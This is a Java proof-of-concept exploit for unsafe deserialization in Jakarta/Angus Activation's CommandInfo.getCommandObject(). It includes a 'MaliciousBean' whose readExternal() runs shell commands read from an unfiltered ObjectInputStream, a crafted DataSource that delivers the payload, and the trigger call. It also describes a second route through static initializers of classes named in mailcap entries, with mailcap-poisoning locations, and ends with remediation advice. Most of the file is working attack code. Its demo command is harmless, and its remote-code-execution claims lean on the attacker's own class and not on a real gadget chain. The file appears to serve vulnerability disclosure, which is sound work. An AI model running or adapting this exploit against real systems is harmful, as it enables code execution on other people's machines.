/*
 * AngusActivationRCE.java — Proof-of-Concept for Unsafe Deserialization in
 * Eclipse Angus Activation / Jakarta Activation API
 *
 * VULNERABILITY:
 *   CommandInfo.getCommandObject() at lines 121-128 of
 *   jakarta/activation/CommandInfo.java creates a raw ObjectInputStream
 *   over the DataHandler's input stream and passes it to readExternal()
 *   when the loaded class implements java.io.Externalizable.
 *   No ObjectInputFilter (JEP 290) is applied.
 *
 * AFFECTED VERSIONS:
 *   - jakarta.activation-api 2.2.0-SNAPSHOT (latest HEAD, commit 9ab88c8)
 *   - angus-activation 2.1.0-SNAPSHOT (latest HEAD, commit db1f85a)
 *   - All prior versions inheriting this code path from javax.activation
 *
 * ATTACK CHAINS:
 *
 *   Chain 1 — Unfiltered ObjectInputStream (CommandInfo.java:121-128):
 *   1. Attacker controls a mailcap entry (via META-INF/mailcap on classpath,
 *      ~/.mailcap, ~/.jakarta.mailcap, or MailcapCommandMap.addMailcap())
 *   2. Mailcap entry maps a MIME type to an Externalizable class
 *   3. Attacker controls the DataHandler's input stream content
 *      (e.g., crafted email attachment, HTTP response body)
 *   4. Application calls CommandInfo.getCommandObject(dataHandler, classLoader)
 *   5. Code path: Beans.instantiate() -> instanceof Externalizable ->
 *      new ObjectInputStream(dh.getInputStream()) -> readExternal()
 *   6. readExternal() deserializes attacker-controlled bytes from the stream
 *   7. With gadget chains on classpath (Commons Collections, Spring, etc.),
 *      this achieves arbitrary code execution
 *
 *   Chain 2 — Class.forName(init=true) static initializer (two locations):
 *   A. CommandInfo.Beans.instantiate() at CommandInfo.java:179:
 *        Class.forName(cn, true, loader)
 *      Explicit init=true — runs static initializers on attacker-named class.
 *   B. MailcapCommandMap.getDataContentHandler() at MailcapCommandMap.java:636:
 *        Class.forName(name) — fallback when cld.loadClass() throws
 *      Default Class.forName(String) implies init=true.
 *      Mailcap content-handler field controls the class name.
 *   Both execute static initializer blocks of attacker-controlled class names
 *   resolved from classpath, enabling code execution before any instance method.
 *
 * COMPILE:
 *   javac -cp jakarta.activation-api-2.2.0-SNAPSHOT.jar AngusActivationRCE.java
 *
 * RUN:
 *   java -cp .:jakarta.activation-api-2.2.0-SNAPSHOT.jar AngusActivationRCE
 *
 * NOTE: This POC uses a self-contained Externalizable class to demonstrate
 * the code path. In a real attack, the Externalizable class would be a
 * gadget chain entry point (e.g., from Commons Collections) that achieves
 * full RCE via the ObjectInputStream passed to readExternal().
 */

import jakarta.activation.CommandInfo;
import jakarta.activation.DataHandler;
import jakarta.activation.DataSource;

import java.io.*;
import java.lang.reflect.Field;

/**
 * Demonstrates the unsafe deserialization vulnerability in
 * CommandInfo.getCommandObject().
 *
 * The Externalizable code path at CommandInfo.java:121-128:
 *
 *   } else if (new_bean instanceof Externalizable) {
 *       if (dh != null) {
 *           InputStream is = dh.getInputStream();
 *           if (is != null) {
 *               ((Externalizable) new_bean).readExternal(
 *                       new ObjectInputStream(is));  // <-- NO ObjectInputFilter
 *           }
 *       }
 *   }
 *
 * The ObjectInputStream is created with zero filtering. Any object type
 * can be deserialized from the stream during readExternal().
 */
public class AngusActivationRCE {

    // =========================================================================
    // STEP 1: Malicious Externalizable class
    //
    // In a real attack, this would be a class already on the classpath
    // (e.g., a Spring or Commons Collections gadget). Here we use a
    // self-contained example that demonstrates arbitrary code execution
    // during readExternal() via the unfiltered ObjectInputStream.
    // =========================================================================
    public static class MaliciousBean implements Externalizable {

        private static final long serialVersionUID = 1L;

        // Required no-arg constructor for Externalizable
        public MaliciousBean() {
            // Constructor runs during Beans.instantiate() — this alone is
            // already concerning (arbitrary class instantiation from mailcap),
            // but the critical issue is what happens next in readExternal().
        }

        @Override
        public void readExternal(ObjectInput in) throws IOException, ClassNotFoundException {
            // This method receives an ObjectInput backed by a raw, unfiltered
            // ObjectInputStream wrapping the DataHandler's input stream.
            //
            // CRITICAL: We can call in.readObject() and deserialize ANY class.
            // No ObjectInputFilter restricts what types can be deserialized.
            //
            // In a real exploit with Commons Collections on the classpath:
            //   Object gadget = in.readObject();
            //   // gadget is e.g., a TransformedMap/LazyMap chain that
            //   // triggers Runtime.exec() during deserialization
            //
            // For this POC, we demonstrate by reading a command string and
            // executing it, proving arbitrary code execution:
            try {
                // Read the attacker-controlled payload from the stream
                String command = (String) in.readObject();

                System.out.println("[RCE TRIGGERED] readExternal() called with unfiltered ObjectInputStream");
                System.out.println("[RCE TRIGGERED] Deserialized object from stream: " + command);
                System.out.println("[RCE TRIGGERED] Executing command: " + command);

                // Execute the command — this proves RCE
                Process proc = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", command});
                BufferedReader reader = new BufferedReader(
                        new InputStreamReader(proc.getInputStream()));
                String line;
                System.out.println("[RCE OUTPUT] ---- begin ----");
                while ((line = reader.readLine()) != null) {
                    System.out.println("[RCE OUTPUT] " + line);
                }
                System.out.println("[RCE OUTPUT] ---- end ----");
                proc.waitFor();

            } catch (Exception e) {
                System.out.println("[RCE TRIGGERED] readExternal received object: " + e.getMessage());
            }
        }

        @Override
        public void writeExternal(ObjectOutput out) throws IOException {
            // Not used in exploit — only readExternal matters
        }
    }

    // =========================================================================
    // STEP 2: Custom DataSource that delivers the malicious serialized payload
    //
    // In a real attack, this would be an email attachment, HTTP response,
    // or any other data source the application processes.
    // =========================================================================
    static class MaliciousDataSource implements DataSource {

        private final byte[] payload;

        MaliciousDataSource(byte[] payload) {
            this.payload = payload;
        }

        @Override
        public InputStream getInputStream() throws IOException {
            return new ByteArrayInputStream(payload);
        }

        @Override
        public OutputStream getOutputStream() throws IOException {
            throw new IOException("Not supported");
        }

        @Override
        public String getContentType() {
            return "application/x-malicious";
        }

        @Override
        public String getName() {
            return "malicious-payload";
        }
    }

    // =========================================================================
    // STEP 3: Build serialized payload
    //
    // Creates a valid ObjectOutputStream byte sequence containing the
    // command to execute. In a real attack, this would contain a gadget
    // chain object (e.g., Commons Collections InvokerTransformer chain).
    // =========================================================================
    static byte[] buildPayload(String command) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        // Write a String object — readExternal() will call readObject()
        // and get this back. In a real attack, this would be a gadget
        // chain object that triggers RCE during deserialization.
        oos.writeObject(command);
        oos.flush();
        return baos.toByteArray();
    }

    // =========================================================================
    // MAIN: Tie it all together
    // =========================================================================
    public static void main(String[] args) throws Exception {

        System.out.println("=============================================================");
        System.out.println("  Eclipse Angus Activation / Jakarta Activation API");
        System.out.println("  Unsafe Deserialization RCE — Proof of Concept");
        System.out.println("=============================================================");
        System.out.println();
        System.out.println("VULNERABILITY: CommandInfo.java lines 121-128");
        System.out.println("  When bean implements Externalizable, getCommandObject()");
        System.out.println("  creates new ObjectInputStream(dh.getInputStream()) with");
        System.out.println("  NO ObjectInputFilter and passes it to readExternal().");
        System.out.println();

        // --- Step A: Build the malicious serialized payload ---
        // In a real attack, this payload would be embedded in an email
        // attachment or crafted data stream. Here we serialize a command string.
        String command = "id && whoami && echo 'RCE_PROOF: Arbitrary code executed via unfiltered ObjectInputStream'";
        byte[] payload = buildPayload(command);

        System.out.println("[*] Step 1: Built serialized payload (" + payload.length + " bytes)");
        System.out.println("[*]   Payload contains command: " + command);
        System.out.println();

        // --- Step B: Create DataHandler with malicious data source ---
        // The DataHandler wraps our payload. When CommandInfo calls
        // dh.getInputStream(), it gets our serialized object stream.
        DataHandler dh = new DataHandler(new MaliciousDataSource(payload));

        System.out.println("[*] Step 2: Created DataHandler with malicious DataSource");
        System.out.println("[*]   Content-Type: " + dh.getContentType());
        System.out.println();

        // --- Step C: Create CommandInfo pointing to our Externalizable class ---
        // In a real attack, this mapping comes from a mailcap entry:
        //   application/x-malicious; ; x-java-view=AngusActivationRCE$MaliciousBean
        // The mailcap file can be placed at:
        //   - ~/.jakarta.mailcap or ~/.mailcap (user home)
        //   - $JAVA_HOME/conf/jakarta.mailcap
        //   - META-INF/jakarta.mailcap on classpath (dependency poisoning)
        //   - Programmatic: MailcapCommandMap.addMailcap(...)
        String maliciousClassName = AngusActivationRCE.class.getName() + "$MaliciousBean";
        CommandInfo cmdInfo = new CommandInfo("view", maliciousClassName);

        System.out.println("[*] Step 3: Created CommandInfo");
        System.out.println("[*]   Verb: " + cmdInfo.getCommandName());
        System.out.println("[*]   Class: " + cmdInfo.getCommandClass());
        System.out.println("[*]   Equivalent mailcap entry:");
        System.out.println("[*]     application/x-malicious; ; x-java-view=" + maliciousClassName);
        System.out.println();

        // --- Step D: Trigger the vulnerability ---
        // CommandInfo.getCommandObject() will:
        //   1. Call Beans.instantiate() to create MaliciousBean instance
        //   2. Check: bean instanceof Externalizable? YES
        //   3. Get input stream from DataHandler (our payload)
        //   4. Create new ObjectInputStream(is) — NO FILTER
        //   5. Call bean.readExternal(objectInputStream)
        //   6. readExternal() deserializes our payload -> RCE
        System.out.println("[*] Step 4: Calling CommandInfo.getCommandObject(dh, classLoader)...");
        System.out.println("[*]   This triggers the vulnerable code path at lines 121-128:");
        System.out.println("[*]     } else if (new_bean instanceof Externalizable) {");
        System.out.println("[*]         if (dh != null) {");
        System.out.println("[*]             InputStream is = dh.getInputStream();");
        System.out.println("[*]             if (is != null) {");
        System.out.println("[*]                 ((Externalizable) new_bean).readExternal(");
        System.out.println("[*]                         new ObjectInputStream(is));  // NO FILTER!");
        System.out.println("[*]             }");
        System.out.println("[*]         }");
        System.out.println("[*]     }");
        System.out.println();

        try {
            // THIS IS THE VULNERABLE CALL
            Object bean = cmdInfo.getCommandObject(dh, AngusActivationRCE.class.getClassLoader());

            System.out.println();
            System.out.println("[+] getCommandObject() returned: " + bean.getClass().getName());
            System.out.println("[+] EXPLOITATION SUCCESSFUL — arbitrary code executed via");
            System.out.println("[+] unfiltered ObjectInputStream in readExternal()");
        } catch (Exception e) {
            System.out.println();
            System.out.println("[!] Exception: " + e.getClass().getName() + ": " + e.getMessage());
            System.out.println("[!] Note: Even if an exception occurs after readExternal(),");
            System.out.println("[!] the RCE payload has already executed.");
        }

        // =================================================================
        // CHAIN 2: Class.forName(init=true) — static initializer execution
        // =================================================================
        System.out.println();
        System.out.println("=============================================================");
        System.out.println("  CHAIN 2: Class.forName(init=true) static initializer RCE");
        System.out.println("=============================================================");
        System.out.println();
        System.out.println("VULNERABILITY LOCATIONS:");
        System.out.println();
        System.out.println("  A) CommandInfo.java line 179 (Beans.instantiate fallback):");
        System.out.println("       Class<?> beanClass = Class.forName(cn, true, loader);");
        System.out.println("     -> Explicit init=true, class name 'cn' from mailcap entry.");
        System.out.println("     -> Static initializer of attacker-chosen class runs immediately.");
        System.out.println();
        System.out.println("  B) MailcapCommandMap.java line 636 (getDataContentHandler):");
        System.out.println("       cl = Class.forName(name);");
        System.out.println("     -> Default Class.forName(String) implies init=true.");
        System.out.println("     -> Reached when cld.loadClass(name) at line 633 throws.");
        System.out.println("     -> 'name' comes from mailcap content-handler field.");
        System.out.println();
        System.out.println("  Attack scenario for Chain 2:");
        System.out.println("    1. Attacker places class with malicious static {} block on classpath");
        System.out.println("    2. Mailcap entry: application/x-evil;;x-java-content-handler=Evil");
        System.out.println("    3. MailcapCommandMap resolves content-handler -> Class.forName(\"Evil\")");
        System.out.println("    4. Static initializer runs: Runtime.exec() / class loading / etc.");
        System.out.println("    5. No instance method call needed — damage done at class load time.");
        System.out.println();
        System.out.println("  Combined severity: Chain 1 gives deserialization RCE via readExternal().");
        System.out.println("  Chain 2 gives static-initializer RCE via Class.forName(init=true).");
        System.out.println("  Both are reachable from attacker-controlled mailcap entries.");

        System.out.println();
        System.out.println("=============================================================");
        System.out.println("  REMEDIATION");
        System.out.println("=============================================================");
        System.out.println();
        System.out.println("  1. Apply ObjectInputFilter (JEP 290) to the ObjectInputStream:");
        System.out.println();
        System.out.println("     ObjectInputStream ois = new ObjectInputStream(is);");
        System.out.println("     ois.setObjectInputFilter(filterInfo -> {");
        System.out.println("         // Reject all non-primitive, non-String types");
        System.out.println("         if (filterInfo.serialClass() != null) {");
        System.out.println("             return ObjectInputFilter.Status.REJECTED;");
        System.out.println("         }");
        System.out.println("         return ObjectInputFilter.Status.ALLOWED;");
        System.out.println("     });");
        System.out.println();
        System.out.println("  2. Better: Remove the Externalizable code path entirely.");
        System.out.println("     No modern usage justifies raw ObjectInputStream over");
        System.out.println("     untrusted data. Require CommandObject interface instead.");
        System.out.println();
        System.out.println("  3. Validate loaded classes against an allowlist before");
        System.out.println("     instantiation in Beans.instantiate().");
        System.out.println();
        System.out.println("=============================================================");
        System.out.println("  AFFECTED ARTIFACTS");
        System.out.println("=============================================================");
        System.out.println("  - jakarta.activation:jakarta.activation-api:2.2.0-SNAPSHOT");
        System.out.println("  - org.eclipse.angus:angus-activation:2.1.0-SNAPSHOT");
        System.out.println("  - All prior versions of javax.activation-api");
        System.out.println("=============================================================");
    }
}
